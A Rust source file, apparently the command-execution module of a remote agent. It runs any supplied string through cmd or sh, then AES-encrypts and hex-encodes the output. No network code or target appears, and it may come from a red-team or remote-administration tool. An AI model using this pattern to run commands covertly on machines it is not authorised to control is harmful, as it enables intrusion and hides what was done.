use std::str;
use std::process::{Command};
use log::{debug, trace, error};

use crate::utils::crypto::*;
use crate::utils::common::*;

/// Function to execute command and get output
pub fn run_and_crypt(command: String, key: Vec<u8>) -> String {
    // EXEC PART
    debug!("run_and_crypt() [COMMAND INPUT]: {:?}",&command);
    let mut output = exec(&command);
    if output.len() == 0 {
        error!("Error during command execution!");
        output = "Error during command execution!".as_bytes().to_vec();
    }
    debug!("run_and_crypt() [COMMAND OUTPUT]: {:?}",display_vecu8(&output));

    // AES PART 
    let encoded = aes_encrypt(&output[..], &key);
    trace!("run_and_crypt() [COMMAND ENCODED]: {:?}",display_vecu8(&encoded));
    let hexa = hex::encode(&encoded);
    trace!("run_and_crypt() [COMMAND ENCODED]: {:?}",&hexa);

    return hexa
}

/// Function to run commands
fn exec(input: &str) -> Vec<u8>
{
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
                .args(["/c", input])
                .output()
                .expect("failed")
    } else {
        Command::new("sh")
                .arg("-c")
                .arg(input)
                .output()
                .expect("failed")
    };
    return output.stdout
}